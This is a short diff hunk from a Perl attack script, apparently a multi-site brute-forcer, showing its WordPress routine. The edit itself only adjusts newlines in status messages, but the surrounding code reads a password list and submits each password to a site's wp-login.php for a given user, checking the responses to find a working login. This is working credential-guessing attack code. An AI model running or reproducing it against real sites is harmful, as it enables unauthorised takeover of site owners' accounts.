@@ -237,14 +237,14 @@ print "Can't Get Username\n\n";
 
 ###### WorDPress #######
 sub wp{
-print"[-] Starting brute force";
+print"[-] Starting brute force\n";
 open(a,"<$pass") or die "$!";
 while(<a>){
 chomp($_);
 $wp = $site . '/wp-login.php';
 $redirect = $site . '/wp-admin/';
 $wpass = $_;
-print "\n[-] Trying: $wpass ";
+print "[-] Trying: $wpass ";
 $wpbrute = POST $wp, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
 $response = $ua->request($wpbrute);
 my $stat = $response->as_string;
